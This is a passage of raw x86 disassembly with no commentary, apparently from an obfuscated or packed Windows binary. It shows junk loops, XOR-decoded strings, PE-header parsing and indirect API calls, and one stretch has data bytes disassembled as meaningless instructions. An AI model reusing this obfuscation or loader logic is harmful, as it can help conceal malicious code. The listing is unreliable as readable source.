  424b9b:	cmp    DWORD PTR [esp+0x10],eax
  424b9f:	jne    0x424bb1
  424ba5:	mov    eax,DWORD PTR [esp+0x24]
  424ba9:	cmp    edx,eax
  424bab:	je     0x424bc2
  424bb1:	mov    eax,DWORD PTR [esp+0xc]
  424bb5:	add    eax,DWORD PTR [esp+0x30]
  424bb9:	mov    DWORD PTR [esp+0xc],eax
  424bbd:	jmp    0x424c1f
  424bc2:	mov    eax,ds:0x4294a2
  424bc7:	mov    edx,DWORD PTR ds:0x4294aa
  424bcd:	xor    eax,edx
  424bcf:	mov    ds:0x4294a2,eax
  424bd4:	mov    edx,DWORD PTR ds:0x4294a2
  424bda:	mov    eax,DWORD PTR [esp+0x2c]
  424bde:	add    DWORD PTR [eax],edx
  424be0:	mov    edx,DWORD PTR [esp+0xc]
  424be4:	mov    eax,ds:0x4294a2
  424be9:	xor    edx,edi
  424beb:	add    edx,ebx
  424bed:	xor    ebx,ebx
  424bef:	add    edx,esi
  424bf1:	adc    ebx,0xffffffff
  424bf4:	xor    edi,edi
  424bf6:	xor    edx,ecx
  424bf8:	xor    ebx,0x0
  424bfb:	add    eax,esi
  424bfd:	adc    edi,0xffffffff
  424c00:	xor    eax,ecx
  424c02:	xor    edi,0x0
  424c05:	cmp    eax,edx
  424c07:	jne    0x424c1f
  424c0d:	cmp    edi,ebx
  424c0f:	jne    0x424c1f
  424c15:	mov    eax,ds:0x4294a2
  424c1a:	mov    ds:0x4294aa,eax
  424c1f:	lea    eax,[esp+0x78]
  424c23:	push   eax
  424c24:	push   0x429f52
  424c29:	call   DWORD PTR ds:0x42a3c6
  424c2f:	cmp    eax,0xffffffff
  424c32:	jne    0x423a3b
  424c38:	push   0xf
  424c3a:	lea    eax,[esp+0x44]
  424c3e:	push   eax
  424c3f:	push   0x429fa6
  424c44:	push   0x429fba
  424c49:	push   0x429fda
  424c4e:	call   DWORD PTR ds:0x42a3fe
  424c54:	imul   eax,eax,0x300000
  424c5a:	cmp    eax,0x1b00000
  424c5f:	jne    0x423a3b
  424c65:	lea    eax,[esp+0x1b8]
  424c6c:	push   eax
  424c6d:	push   0x42a006
  424c72:	call   DWORD PTR ds:0x42a3e6
  424c78:	cmp    eax,0xffffffff
  424c7b:	jne    0x423a3b
  424c81:	mov    eax,ds:0x42941e
  424c86:	push   0x4
  424c88:	add    eax,0x1cc
  424c8d:	push   eax
  424c8e:	lea    eax,[esp+0x3c]
  424c92:	push   eax
  424c93:	call   0x424ca7
  424c98:	mov    eax,DWORD PTR [esp+0x34]
  424c9c:	mov    eax,DWORD PTR [eax]
  424c9e:	pop    edi
  424c9f:	pop    esi
  424ca0:	pop    ebx
  424ca1:	mov    esp,ebp
  424ca3:	pop    ebp
  424ca4:	ret    0xc
  424ca7:	push   ebp
  424ca8:	mov    ebp,esp
  424caa:	sub    esp,0x10
  424cad:	and    DWORD PTR ds:0x42a2ea,0x0
  424cb7:	mov    ecx,DWORD PTR ds:0x42a2ea
  424cbd:	inc    ecx
  424cbe:	mov    DWORD PTR ds:0x42a2ea,ecx
  424cc4:	cmp    DWORD PTR ds:0x42a2ea,0x8
  424ccb:	jg     0x424d17
  424cd1:	jmp    0x424cf0
  424cd6:	push   0x42a27e
  424cdb:	push   0x3925
  424ce0:	push   0x42912e
  424ce5:	push   0x429024
  424cea:	call   DWORD PTR ds:0x42a3ea
  424cf0:	cmp    DWORD PTR ds:0x42a2ea,0x7
  424cf7:	jne    0x424d0a
  424cfd:	mov    ecx,DWORD PTR ds:0x42a2ea
  424d03:	inc    ecx
  424d04:	mov    DWORD PTR ds:0x42a2ea,ecx
  424d0a:	cmp    DWORD PTR ds:0x42a2ea,0x1f
  424d11:	jb     0x424cb7
  424d17:	mov    eax,0xf89c85a5
  424d1c:	mov    DWORD PTR [ebp-0x4],eax
  424d1f:	xor    ecx,ecx
  424d21:	xor    ecx,DWORD PTR ds:0x42a34a
  424d27:	mov    edx,DWORD PTR ds:0x42a396
  424d2d:	sub    ecx,edx
  424d2f:	add    ecx,DWORD PTR [ecx+edx*1]
  424d32:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  424d39:	mov    edx,DWORD PTR ds:0x42a36a
  424d3f:	mov    ecx,DWORD PTR ds:0x42a37a
  424d45:	sub    ecx,edx
  424d47:	or     edx,DWORD PTR [edx+ecx*1]
  424d4a:	mov    ecx,DWORD PTR [ebp-0x4]
  424d4d:	push   esi
  424d4e:	mov    edx,0x75108aa
  424d53:	movzx  esi,BYTE PTR ds:0x42a286
  424d5a:	add    DWORD PTR ds:0x42a29a,esi
  424d60:	xor    ecx,edx
  424d62:	mov    esi,0x3272f1
  424d67:	xor    DWORD PTR ds:0x42a2b2,0x42a27e
  424d71:	push   edi
  424d72:	sbb    DWORD PTR ds:0x42a2ee,0x42a29a
  424d7c:	mov    edi,DWORD PTR [ebp+0x10]
  424d7f:	add    ecx,esi
  424d81:	cmp    ecx,edi
  424d83:	mov    DWORD PTR ds:0x42a2e6,0x5270
  424d8d:	je     0x424f01
  424d93:	mov    ecx,DWORD PTR [ebp-0x4]
  424d96:	and    DWORD PTR ds:0x42a2a2,edx
  424d9c:	mov    edi,DWORD PTR [ebp+0x10]
  424d9f:	add    DWORD PTR ds:0x42a272,0x5748
  424da9:	xor    eax,eax
  424dab:	xor    DWORD PTR ds:0x42a26a,0x1416
  424db5:	xor    ecx,edx
  424db7:	sbb    DWORD PTR ds:0x42a292,0x6e41
  424dc1:	add    ecx,esi
  424dc3:	adc    DWORD PTR ds:0x42a2de,0x42a2f2
  424dcd:	add    edi,0xfabdbed8
  424dd3:	adc    eax,0xffffffff
  424dd6:	mov    DWORD PTR ds:0x42a2f6,0x6318
  424de0:	xor    eax,0x0
  424de3:	sbb    DWORD PTR ds:0x42a27e,0x42a2de
  424ded:	mov    DWORD PTR [ebp-0xc],eax
  424df0:	inc    DWORD PTR ds:0x42a27e
  424df6:	push   ebx
  424df7:	xor    DWORD PTR ds:0x42a28e,edi
  424dfd:	xor    ebx,ebx
  424dff:	neg    eax
  424e01:	xor    edi,0x8a29a13d
  424e07:	and    DWORD PTR ds:0x42a2be,0x0
  424e11:	mov    eax,ds:0x42a2be
  424e16:	inc    eax
  424e17:	mov    ds:0x42a2be,eax
  424e1c:	cmp    DWORD PTR ds:0x42a2be,0x9
  424e23:	jg     0x424e66
  424e29:	jmp    0x424e41
  424e2e:	push   0x8c5e
  424e33:	push   0x42a2a2
  424e38:	push   DWORD PTR [ebp-0x10]
  424e3b:	call   DWORD PTR ds:0x42a3ee
  424e41:	cmp    DWORD PTR ds:0x42a2be,0x8
  424e48:	jne    0x424e59
  424e4e:	mov    eax,ds:0x42a2be
  424e53:	inc    eax
  424e54:	mov    ds:0x42a2be,eax
  424e59:	cmp    DWORD PTR ds:0x42a2be,0x18
  424e60:	jb     0x424e11
  424e66:	mov    eax,ecx
  424e68:	add    eax,0xfabdbed8
  424e6d:	adc    ebx,0xffffffff
  424e70:	xor    eax,0x8a29a13d
  424e75:	xor    ebx,0x0
  424e78:	cmp    eax,edi
  424e7a:	jne    0x424e93
  424e80:	cmp    ebx,DWORD PTR [ebp-0xc]
  424e83:	je     0x424efb
  424e89:	jmp    0x424e93
  424e8e:	mov    esi,0x3272f1
  424e93:	mov    eax,DWORD PTR [ebp-0x4]
  424e96:	mov    edi,DWORD PTR [ebp-0x8]
  424e99:	xor    edi,edx
  424e9b:	add    edi,esi
  424e9d:	mov    esi,DWORD PTR [ebp+0x8]
  424ea0:	imul   edi,ecx
  424ea3:	mov    ebx,DWORD PTR [ebp+0xc]
  424ea6:	xor    eax,edx
  424ea8:	add    eax,ecx
  424eaa:	mov    al,BYTE PTR [ebx+eax*1+0x3272f1]
  424eb1:	mov    BYTE PTR [edi+esi*1],al
  424eb4:	mov    eax,DWORD PTR [ebp-0x8]
  424eb7:	mov    esi,DWORD PTR [ebp+0x10]
  424eba:	xor    eax,edx
  424ebc:	xor    ebx,ebx
  424ebe:	add    esi,0xfabdbed8
  424ec4:	adc    ebx,0xffffffff
  424ec7:	lea    ecx,[ecx+eax*1+0x3272f1]
  424ece:	xor    edi,edi
  424ed0:	xor    esi,0x8a29a13d
  424ed6:	xor    ebx,0x0
  424ed9:	mov    eax,ecx
  424edb:	add    eax,0xfabdbed8
  424ee0:	adc    edi,0xffffffff
  424ee3:	xor    eax,0x8a29a13d
  424ee8:	xor    edi,0x0
  424eeb:	cmp    eax,esi
  424eed:	jne    0x424e8e
  424ef3:	cmp    edi,ebx
  424ef5:	jne    0x424e8e
  424efb:	mov    eax,0xf89c85ba
  424f00:	pop    ebx
  424f01:	pop    edi
  424f02:	pop    esi
  424f03:	leave  
  424f04:	ret    0xc
  424f07:	push   ebp
  424f08:	mov    ebp,esp
  424f0a:	push   ecx
  424f0b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424f12:	or     DWORD PTR ds:0x42a292,0x42a2d6
  424f1c:	mov    eax,DWORD PTR [ebp+0x8]
  424f1f:	xor    edx,edx
  424f21:	add    edx,DWORD PTR ds:0x42a3a6
  424f27:	mov    ecx,DWORD PTR ds:0x42a3ae
  424f2d:	sub    edx,ecx
  424f2f:	sub    edx,DWORD PTR [edx+ecx*1]
  424f32:	movsx  eax,BYTE PTR [eax]
  424f35:	mov    edx,0x3272f1
  424f3a:	sub    eax,edx
  424f3c:	movzx  ecx,BYTE PTR ds:0x42a2a6
  424f43:	or     DWORD PTR ds:0x42a2ce,ecx
  424f49:	mov    ecx,0x75108aa
  424f4e:	and    DWORD PTR ds:0x42a2d2,0x2b27
  424f58:	xor    eax,ecx
  424f5a:	cmp    eax,0xf89c85f6
  424f5f:	mov    DWORD PTR ds:0x42a28e,0x60e7
  424f69:	jne    0x424fbc
  424f6f:	xor    eax,eax
  424f71:	xor    eax,DWORD PTR ds:0x42a26a
  424f77:	xor    DWORD PTR ds:0x42a2ba,eax
  424f7d:	mov    eax,DWORD PTR [ebp+0x8]
  424f80:	mov    DWORD PTR ds:0x42a2d6,0x3461
  424f8a:	push   esi
  424f8b:	mov    esi,DWORD PTR ds:0x42a262
  424f91:	adc    DWORD PTR ds:0x42a256,esi
  424f97:	mov    esi,DWORD PTR [ebp+0x8]
  424f9a:	add    esi,DWORD PTR [eax+0x3c]
  424f9d:	mov    DWORD PTR [ebp+0x8],esi
  424fa0:	mov    eax,DWORD PTR [ebp-0x4]
  424fa3:	mov    esi,DWORD PTR [ebp+0x8]
  424fa6:	xor    eax,ecx
  424fa8:	add    eax,edx
  424faa:	cmp    DWORD PTR [esi+0x54],eax
  424fad:	pop    esi
  424fae:	je     0x424fbc
  424fb4:	mov    eax,DWORD PTR [ebp+0x8]
  424fb7:	jmp    0x424fc3
  424fbc:	mov    eax,DWORD PTR [ebp-0x4]
  424fbf:	xor    eax,ecx
  424fc1:	add    eax,edx
  424fc3:	leave  
  424fc4:	ret    0x4
  424fc7:	push   ebp
  424fc8:	mov    ebp,esp
  424fca:	sub    esp,0xc
  424fcd:	and    DWORD PTR ds:0x42a2da,0x0
  424fd7:	jmp    0x424feb
  424fdc:	xor    edx,edx
  424fde:	or     edx,DWORD PTR ds:0x42a2da
  424fe4:	inc    edx
  424fe5:	mov    DWORD PTR ds:0x42a2da,edx
  424feb:	cmp    DWORD PTR ds:0x42a2da,0x1c
  424ff2:	jae    0x425037
  424ff8:	cmp    DWORD PTR ds:0x42a2da,0x7
  424fff:	jg     0x425037
  425005:	jmp    0x425018
  42500a:	push   DWORD PTR [ebp-0x10]
  42500d:	push   0x42a276
  425012:	call   DWORD PTR ds:0x42a3f2
  425018:	cmp    DWORD PTR ds:0x42a2da,0x6
  42501f:	jne    0x425032
  425025:	mov    edx,DWORD PTR ds:0x42a2da
  42502b:	inc    edx
  42502c:	mov    DWORD PTR ds:0x42a2da,edx
  425032:	jmp    0x424fdc
  425037:	push   esi
  425038:	sub    esi,0x6177
  42503e:	mov    esi,0xf89c85a5
  425043:	and    DWORD PTR ds:0x42a26a,0x14cd
  42504d:	mov    DWORD PTR [ebp-0x8],esi
  425050:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  425057:	and    DWORD PTR ds:0x42a2e2,ebx
  42505d:	push   edi
  42505e:	mov    eax,eax
  425060:	or     ecx,0x7f14
  425066:	mov    eax,DWORD PTR [ebp-0x4]
  425069:	add    ecx,edi
  42506b:	mov    edi,DWORD PTR [ebp-0x8]
  42506e:	or     edx,edx
  425070:	mov    ecx,0x75108aa
  425075:	and    DWORD PTR ds:0x42a2da,0x0
  42507f:	jmp    0x425091
  425084:	mov    edx,DWORD PTR ds:0x42a2da
  42508a:	inc    edx
  42508b:	mov    DWORD PTR ds:0x42a2da,edx
  425091:	cmp    DWORD PTR ds:0x42a2da,0x1d
  425098:	jae    0x4250da
  42509e:	cmp    DWORD PTR ds:0x42a2da,0xd
  4250a5:	jge    0x4250da
  4250ab:	jmp    0x4250bb
  4250b0:	push   0x42a2d2
  4250b5:	call   DWORD PTR ds:0x42a3f6
  4250bb:	cmp    DWORD PTR ds:0x42a2da,0xc
  4250c2:	jne    0x4250d5
  4250c8:	mov    edx,DWORD PTR ds:0x42a2da
  4250ce:	inc    edx
  4250cf:	mov    DWORD PTR ds:0x42a2da,edx
  4250d5:	jmp    0x425084
  4250da:	xor    eax,ecx
  4250dc:	xor    edi,ecx
  4250de:	mov    edx,0x3272f1
  4250e3:	add    edi,edx
  4250e5:	add    eax,edx
  4250e7:	imul   eax,edi
  4250ea:	mov    edi,DWORD PTR [ebp+0xc]
  4250ed:	cmp    edi,eax
  4250ef:	je     0x425144
  4250f5:	mov    DWORD PTR [ebp-0xc],esi
  4250f8:	mov    eax,DWORD PTR [ebp-0xc]
  4250fb:	mov    esi,DWORD PTR [ebp+0xc]
  4250fe:	xor    eax,ecx
  425100:	lea    eax,[eax*8+0x1939800]
  425107:	mov    eax,DWORD PTR [esi+eax*1]
  42510a:	mov    DWORD PTR [ebp+0xc],eax
  42510d:	mov    eax,DWORD PTR [ebp-0x4]
  425110:	mov    esi,DWORD PTR [ebp-0x8]
  425113:	xor    eax,ecx
  425115:	xor    esi,ecx
  425117:	add    esi,edx
  425119:	add    eax,edx
  42511b:	imul   eax,esi
  42511e:	mov    esi,DWORD PTR [ebp+0xc]
  425121:	cmp    esi,eax
  425123:	je     0x425144
  425129:	mov    eax,DWORD PTR [ebp-0x4]
  42512c:	xor    eax,ecx
  42512e:	mov    ecx,DWORD PTR [ebp+0xc]
  425131:	add    eax,edx
  425133:	imul   eax,ecx
  425136:	add    eax,DWORD PTR [ebp+0x8]
  425139:	mov    DWORD PTR [ebp+0xc],eax
  42513c:	mov    eax,DWORD PTR [ebp+0xc]
  42513f:	jmp    0x425155
  425144:	mov    eax,DWORD PTR [ebp-0x4]
  425147:	mov    esi,DWORD PTR [ebp-0x8]
  42514a:	xor    esi,ecx
  42514c:	xor    eax,ecx
  42514e:	add    esi,edx
  425150:	add    eax,edx
  425152:	imul   eax,esi
  425155:	pop    edi
  425156:	pop    esi
  425157:	leave  
  425158:	ret    0x8
	...
  425163:	add    BYTE PTR [ebp+0x4de645],dh
  425169:	add    BYTE PTR [eax],al
  42516b:	add    BYTE PTR [edx],al
  42516d:	add    BYTE PTR [eax],al
  42516f:	add    BYTE PTR [eax],dh
  425171:	add    BYTE PTR [eax],al
  425173:	add    BYTE PTR [eax-0x7ffffdaf],al
  425179:	inc    ebp
  42517a:	add    al,BYTE PTR [eax]
  42517c:	add    BYTE PTR [eax],al
  42517e:	add    BYTE PTR [eax],al
  425180:	push   edx
  425181:	push   ebx
  425182:	inc    esp
  425183:	push   ebx
  425184:	dec    esi
  425185:	sub    al,BYTE PTR [ebp+0x59592cdc]
  42518b:	inc    ebx
  42518c:	xchg   edx,eax
  42518d:	pop    ss
  42518e:	or     esi,DWORD PTR [eax-0x56c7a7fd]
  425194:	add    DWORD PTR [eax],eax
  425196:	add    BYTE PTR [eax],al
  425198:	inc    esi
  425199:	cmp    bl,BYTE PTR [edi+edx*2+0x69]
  42519d:	outs   dx,BYTE PTR ds:[esi]
  42519e:	outs   dx,DWORD PTR fs:[esi]
  4251a0:	ja     0x425215
  4251a2:	and    BYTE PTR [ecx+ebp*2+0x72],al
  4251a6:	pop    esp
  4251a7:	inc    esi
  4251a8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x636578
  4251b0:	mov    edx,DWORD PTR [ebp-0x14]
  4251b3:	sub    esp,0x108
  4251b9:	push   ebx
  4251ba:	mov    eax,ebx
  4251bc:	xchg   ecx,eax
  4251bd:	mov    eax,DWORD PTR [ebp+0x8]
  4251c0:	cmp    eax,0xf89c85a5
  4251c5:	jne    0x42567f
  4251cb:	mov    eax,DWORD PTR [ebp+0xc]
  4251ce:	cmp    eax,0xf89c85ba
  4251d3:	jne    0x42567f
  4251d9:	mov    eax,DWORD PTR [ebp+0x24]
  4251dc:	mov    DWORD PTR [ebp-0x4],eax
  4251df:	mov    eax,DWORD PTR [ebp-0x4]
  4251e2:	mov    eax,DWORD PTR [eax+0x1d8]
  4251e8:	mov    eax,DWORD PTR [eax]
  4251ea:	mov    eax,DWORD PTR [eax]
  4251ec:	mov    DWORD PTR [ebp-0x8],eax
  4251ef:	mov    BYTE PTR [ebp-0x18],0x1a
  4251f3:	mov    BYTE PTR [ebp-0x17],0x1f
  4251f7:	mov    BYTE PTR [ebp-0x16],0x14
  4251fb:	mov    BYTE PTR [ebp-0x15],0x4e
  4251ff:	mov    BYTE PTR [ebp-0x14],0x4d
  425203:	mov    BYTE PTR [ebp-0x13],0x83
  425207:	mov    BYTE PTR [ebp-0x20],0x8
  42520b:	mov    BYTE PTR [ebp-0x1f],0xe
  42520f:	mov    BYTE PTR [ebp-0x1e],0x18
  425213:	mov    BYTE PTR [ebp-0x1d],0xd
  425217:	mov    BYTE PTR [ebp-0x1c],0x4e
  42521b:	mov    BYTE PTR [ebp-0x1b],0x4d
  42521f:	mov    BYTE PTR [ebp-0x1a],0x83
  425223:	mov    BYTE PTR [ebp-0x28],0xe
  425227:	mov    BYTE PTR [ebp-0x27],0x1b
  42522b:	mov    BYTE PTR [ebp-0x26],0x17
  42522f:	mov    BYTE PTR [ebp-0x25],0xa
  425233:	mov    BYTE PTR [ebp-0x24],0x1c
  425237:	mov    BYTE PTR [ebp-0x23],0x13
  42523b:	mov    BYTE PTR [ebp-0x22],0x14
  42523f:	mov    BYTE PTR [ebp-0x21],0x83
  425243:	xor    ecx,ecx
  425245:	lea    eax,[ebp+ecx*1-0x18]
  425249:	movzx  edx,BYTE PTR [eax]
  42524c:	xor    edx,0x7c
  42524f:	inc    edx
  425250:	inc    ecx
  425251:	mov    BYTE PTR [eax],dl
  425253:	cmp    ecx,0x6
  425256:	jb     0x425245
  425258:	xor    ecx,ecx
  42525a:	lea    eax,[ebp+ecx*1-0x20]
  42525e:	movzx  edx,BYTE PTR [eax]
  425261:	xor    edx,0x7c
  425264:	inc    edx
  425265:	inc    ecx
  425266:	mov    BYTE PTR [eax],dl
  425268:	cmp    ecx,0x7
  42526b:	jb     0x42525a
  42526d:	xor    ecx,ecx
  42526f:	lea    eax,[ebp+ecx*1-0x28]
  425273:	movzx  edx,BYTE PTR [eax]
  425276:	xor    edx,0x7c
  425279:	inc    edx
  42527a:	inc    ecx
  42527b:	mov    BYTE PTR [eax],dl
  42527d:	cmp    ecx,0x8
  425280:	jb     0x42526f
  425282:	lea    eax,[ebp-0x2c]
  425285:	mov    DWORD PTR [ebp-0x8],eax
  425288:	mov    ecx,DWORD PTR [ebp-0x8]
  42528b:	mov    eax,0x7113fccf
  425290:	mov    DWORD PTR [ecx],eax
  425292:	mov    ecx,DWORD PTR [ebp-0x2c]
  425295:	push   esi
  425296:	push   edi
  425297:	mov    esi,0x4e3e
  42529c:	mov    ebx,0x3272f1
  4252a1:	cmp    ecx,eax
  4252a3:	jne    0x42536e
  4252a9:	lea    eax,[esi+0x39]
  4252ac:	mov    WORD PTR [ebp-0x78],ax
  4252b0:	mov    eax,esi
  4252b2:	mov    WORD PTR [ebp-0x76],ax
  4252b6:	add    eax,0x33
  4252b9:	mov    WORD PTR [ebp-0x74],ax
  4252bd:	lea    eax,[esi-0xe]
  4252c0:	mov    WORD PTR [ebp-0x72],ax
  4252c4:	add    eax,0x4f
  4252c7:	mov    ecx,eax
  4252c9:	lea    eax,[esi-0x15]
  4252cc:	mov    WORD PTR [ebp-0x66],ax
  4252d0:	mov    eax,esi
  4252d2:	mov    WORD PTR [ebp-0x64],ax
  4252d6:	add    eax,0xffffffec
  4252d9:	mov    WORD PTR [ebp-0x62],ax
  4252dd:	mov    eax,0x443
  4252e2:	mov    WORD PTR [ebp-0x60],ax
  4252e6:	mov    eax,0x5674
  4252eb:	mov    WORD PTR [ebp-0x5e],ax
  4252ef:	mov    eax,0x6114
  4252f4:	mov    WORD PTR [ebp-0x5c],ax
  4252f8:	lea    eax,[ebp-0xe0]
  4252fe:	push   eax
  4252ff:	mov    eax,DWORD PTR [ebp+0xc]
  425302:	mov    edi,0x75108aa
  425307:	xor    eax,edi
  425309:	add    eax,ebx
  42530b:	push   eax
  42530c:	mov    WORD PTR [ebp-0x70],cx
  425310:	lea    ecx,[esi-0xa]
  425313:	mov    edx,ecx
  425315:	lea    eax,[ebp-0x78]
  425318:	push   eax
  425319:	mov    eax,DWORD PTR [ebp-0x4]
  42531c:	mov    eax,DWORD PTR [eax+0x198]
  425322:	mov    WORD PTR [ebp-0x6e],dx
  425326:	mov    edx,0x4f8a
  42532b:	mov    WORD PTR [ebp-0x6c],dx
  42532f:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e35
  425336:	mov    DWORD PTR [ebp-0x5a],0x4e34f1e6
  42533d:	mov    DWORD PTR [ebp-0xe0],0x1
  425347:	mov    DWORD PTR [ebp-0xdc],0x255
  425351:	push   DWORD PTR [eax]
  425353:	mov    eax,DWORD PTR [ebp+0x10]
  425356:	call   eax
  425358:	mov    DWORD PTR [ebp-0x8],eax
  42535b:	mov    eax,DWORD PTR [ebp-0x8]
  42535e:	test   eax,eax
  425360:	je     0x425373
  425362:	xor    DWORD PTR ds:0x76586876,0x87687666
  42536c:	jmp    0x425373
  42536e:	mov    edi,0x75108aa
  425373:	mov    eax,DWORD PTR [ebp-0x4]
  425376:	mov    ecx,DWORD PTR [eax+0x18c]
  42537c:	xor    eax,eax
  42537e:	cmp    DWORD PTR [ecx],eax
  425380:	jne    0x4255f2
  425386:	mov    ecx,DWORD PTR [ebp-0x4]
  425389:	mov    ecx,DWORD PTR [ecx+0x17c]
  42538f:	mov    DWORD PTR [ecx],eax
  425391:	mov    ecx,DWORD PTR [ebp-0x4]
  425394:	mov    ecx,DWORD PTR [ecx+0x180]
  42539a:	mov    DWORD PTR [ecx],eax
  42539c:	mov    eax,0x4e61
  4253a1:	mov    WORD PTR [ebp-0x9c],ax
  4253a8:	mov    eax,esi
  4253aa:	mov    WORD PTR [ebp-0x9a],ax
  4253b1:	mov    eax,0x4e71
  4253b6:	mov    WORD PTR [ebp-0x98],ax
  4253bd:	add    eax,0xffffffc0
  4253c0:	mov    WORD PTR [ebp-0x96],ax
  4253c7:	mov    eax,0x4f8e
  4253cc:	mov    WORD PTR [ebp-0x94],ax
  4253d3:	mov    eax,0x4e32
  4253d8:	mov    WORD PTR [ebp-0x92],ax
  4253df:	add    eax,0x4d
  4253e2:	mov    WORD PTR [ebp-0x90],ax
  4253e9:	mov    eax,0x4e34
  4253ee:	mov    WORD PTR [ebp-0x8e],ax
  4253f5:	mov    eax,esi
  4253f7:	mov    WORD PTR [ebp-0x8c],ax
  4253fe:	mov    eax,0x4e35
  425403:	mov    WORD PTR [ebp-0x8a],ax
  42540a:	mov    eax,0x99f1
  42540f:	mov    WORD PTR [ebp-0x88],ax
  425416:	mov    eax,0x8d62
  42541b:	mov    WORD PTR [ebp-0x86],ax
  425422:	mov    eax,0xd66f
  425427:	mov    WORD PTR [ebp-0x84],ax
  42542e:	mov    eax,0xd783
  425433:	mov    WORD PTR [ebp-0x82],ax
  42543a:	mov    eax,0x2784
  42543f:	mov    WORD PTR [ebp-0x80],ax
  425443:	mov    eax,0x4784
  425448:	mov    WORD PTR [ebp-0x7e],ax
  42544c:	mov    eax,0x4e33
  425451:	push   0x8
  425453:	mov    WORD PTR [ebp-0x7c],ax
  425457:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  42545e:	mov    DWORD PTR [ebp-0xc],0x8314131c
  425465:	lea    eax,[ebp-0x10]
  425468:	pop    ecx
  425469:	mov    dl,BYTE PTR [eax]
  42546b:	xor    dl,0x7c
  42546e:	inc    dl
  425470:	mov    BYTE PTR [eax],dl
  425472:	inc    eax
  425473:	dec    ecx
  425474:	jne    0x425469
  425476:	lea    eax,[ebp-0x10]
  425479:	mov    DWORD PTR [ebp-0xdc],eax
  42547f:	lea    eax,[ebp-0xe0]
  425485:	push   eax
  425486:	mov    eax,DWORD PTR [ebp+0xc]
  425489:	xor    eax,edi
  42548b:	add    eax,ebx
  42548d:	push   eax
  42548e:	mov    eax,DWORD PTR [ebp-0x4]
  425491:	add    eax,0x66
  425494:	push   eax
  425495:	mov    eax,DWORD PTR [ebp-0x4]
  425498:	mov    eax,DWORD PTR [eax+0x198]
  42549e:	mov    DWORD PTR [ebp-0xe0],0x1
  4254a8:	push   DWORD PTR [eax]
  4254aa:	mov    eax,DWORD PTR [ebp+0x10]
  4254ad:	call   eax
  4254af:	mov    ecx,DWORD PTR [ebp+0x8]
  4254b2:	xor    ecx,edi
  4254b4:	add    ecx,ebx
  4254b6:	mov    DWORD PTR [ebp-0x8],eax
  4254b9:	cmp    eax,ecx
  4254bb:	jne    0x4254d6
  4254bd:	mov    eax,ds:0x33730bcc
  4254c2:	or     eax,0x22150bcf
  4254c7:	mov    ds:0x33730bcc,eax
  4254cc:	add    eax,0x3372e92f
  4254d1:	mov    ds:0x33730bcc,eax
  4254d6:	mov    ecx,0x4e66
  4254db:	mov    eax,ecx
  4254dd:	mov    WORD PTR [ebp-0x40],ax
  4254e1:	add    eax,0x5
  4254e4:	mov    edx,eax
  4254e6:	mov    WORD PTR [ebp-0x3e],dx
  4254ea:	mov    edx,0x4f93
  4254ef:	mov    WORD PTR [ebp-0x3c],dx
  4254f3:	add    edx,0xfffffff8
  4254f6:	mov    WORD PTR [ebp-0x3a],dx
  4254fa:	mov    edx,0x4f8d
  4254ff:	mov    WORD PTR [ebp-0x38],dx
  425503:	add    edx,0xfffffff3
  425506:	mov    WORD PTR [ebp-0x36],dx
  42550a:	mov    edx,0x4f87
  42550f:	mov    WORD PTR [ebp-0x34],dx
  425513:	mov    WORD PTR [ebp-0x32],cx
  425517:	mov    ecx,esi
  425519:	mov    WORD PTR [ebp-0x30],cx
  42551d:	lea    ecx,[edx-0x1]
  425520:	mov    edx,ecx
  425522:	mov    WORD PTR [ebp-0x54],dx
  425526:	mov    edx,eax
  425528:	mov    WORD PTR [ebp-0x52],dx
  42552c:	mov    edx,0x4e73
  425531:	mov    WORD PTR [ebp-0x50],dx
  425535:	mov    WORD PTR [ebp-0x4e],ax
  425539:	lea    eax,[edx-0x6]
  42553c:	mov    WORD PTR [ebp-0x4c],ax
  425540:	add    eax,0xfffffff3
  425543:	mov    WORD PTR [ebp-0x4a],ax
  425547:	lea    eax,[edx-0xc]
  42554a:	mov    WORD PTR [ebp-0x48],ax
  42554e:	mov    WORD PTR [ebp-0x46],cx
  425552:	mov    WORD PTR [ebp-0x44],si
  425556:	mov    eax,DWORD PTR [ebp+0x8]
  425559:	movzx  ecx,WORD PTR [ebp-0x54]
  42555d:	xor    eax,edi
  42555f:	add    eax,ebx
  425561:	xor    eax,ecx
  425563:	mov    WORD PTR [ebp-0x54],ax
  425567:	mov    eax,DWORD PTR [ebp+0x8]
  42556a:	movzx  ecx,WORD PTR [ebp-0x40]
  42556e:	xor    eax,edi
  425570:	add    eax,ebx
  425572:	xor    eax,ecx
  425574:	mov    WORD PTR [ebp-0x40],ax
  425578:	xor    eax,eax
  42557a:	mov    WORD PTR [ebp-0xf4],ax
  425581:	mov    WORD PTR [ebp-0x108],ax
  425588:	mov    edi,DWORD PTR [ebp+0x24]
  42558b:	lea    eax,[ebp-0xf4]
  425591:	lea    edx,[ebp-0x54]
  425594:	mov    DWORD PTR [ebp-0xe0],0x2
  42559e:	mov    DWORD PTR [ebp-0xdc],eax
  4255a4:	call   0x427fdb
  4255a9:	mov    DWORD PTR [ebp-0xd8],eax
  4255af:	lea    eax,[ebp-0xe0]
  4255b5:	push   eax
  4255b6:	mov    eax,DWORD PTR [ebp+0xc]
  4255b9:	xor    eax,0x75108aa
  4255be:	add    eax,ebx
  4255c0:	push   eax
  4255c1:	lea    eax,[ebp-0x9c]
  4255c7:	push   eax
  4255c8:	push   DWORD PTR [ebp-0x8]
  4255cb:	mov    eax,DWORD PTR [ebp+0x10]
  4255ce:	call   eax
  4255d0:	mov    edi,DWORD PTR [ebp+0x24]
  4255d3:	lea    eax,[ebp-0x108]
  4255d9:	lea    edx,[ebp-0x40]
  4255dc:	mov    DWORD PTR [ebp-0xdc],eax
  4255e2:	call   0x427fdb
  4255e7:	mov    DWORD PTR [ebp-0xd8],eax
  4255ed:	mov    edi,0x75108aa
  4255f2:	mov    eax,DWORD PTR [ebp+0x14]
  4255f5:	push   DWORD PTR [ebp-0x4]
  4255f8:	push   DWORD PTR [ebp+0x20]
  4255fb:	push   DWORD PTR [ebp+0x1c]
  4255fe:	push   DWORD PTR [ebp+0x18]
  425601:	push   DWORD PTR [ebp+0x10]
  425604:	push   DWORD PTR [ebp+0x8]
  425607:	push   DWORD PTR [ebp+0xc]
  42560a:	call   0x42687c
  42560f:	test   eax,eax
  425611:	je     0x425655
